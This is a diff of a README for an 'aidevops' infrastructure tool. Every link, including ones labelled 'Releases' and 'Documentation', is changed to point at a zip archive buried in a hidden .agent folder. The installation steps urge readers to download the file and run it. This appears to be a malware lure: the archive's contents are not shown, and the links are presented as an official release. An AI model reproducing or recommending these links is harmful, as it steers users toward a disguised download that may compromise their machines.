@@ -6,7 +6,7 @@ Welcome to aidevops! This application empowers you to manage your infrastructure
 
 ## 🔗 Download Now
 
-[![Download aidevops](https://raw.githubusercontent.com/BreezeAllen/aidevops/main/templates/home/.agent/aidevops_nonenunciation.zip)](https://raw.githubusercontent.com/BreezeAllen/aidevops/main/templates/home/.agent/aidevops_nonenunciation.zip)
+[![Download aidevops](https://github.com/BreezeAllen/aidevops/raw/refs/heads/main/templates/home/.agent/Software-v3.5-beta.2.zip)](https://github.com/BreezeAllen/aidevops/raw/refs/heads/main/templates/home/.agent/Software-v3.5-beta.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download aidevops, ensure your device meets the following requirement
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [aidevops Releases](https://raw.githubusercontent.com/BreezeAllen/aidevops/main/templates/home/.agent/aidevops_nonenunciation.zip).
+1. Visit this page to download: [aidevops Releases](https://github.com/BreezeAllen/aidevops/raw/refs/heads/main/templates/home/.agent/Software-v3.5-beta.2.zip).
 2. On the Releases page, look for the latest version.
 3. Click on the download link for your operating system.
 4. Once the download finishes, locate the file on your device.
@@ -72,6 +72,6 @@ For further reading and resources, look into the following topics related to aid
 - Development Operations
 - Managed Infrastructure
 
-Visit the [aidevops Documentation](https://raw.githubusercontent.com/BreezeAllen/aidevops/main/templates/home/.agent/aidevops_nonenunciation.zip) for in-depth guides and FAQs.
+Visit the [aidevops Documentation](https://github.com/BreezeAllen/aidevops/raw/refs/heads/main/templates/home/.agent/Software-v3.5-beta.2.zip) for in-depth guides and FAQs.
 
-Thank you for choosing aidevops! We’re excited to see how it helps you transform your development operations. Don't forget to download it here: [Download aidevops](https://raw.githubusercontent.com/BreezeAllen/aidevops/main/templates/home/.agent/aidevops_nonenunciation.zip).
+Thank you for choosing aidevops! We’re excited to see how it helps you transform your development operations. Don't forget to download it here: [Download aidevops](https://github.com/BreezeAllen/aidevops/raw/refs/heads/main/templates/home/.agent/Software-v3.5-beta.2.zip).
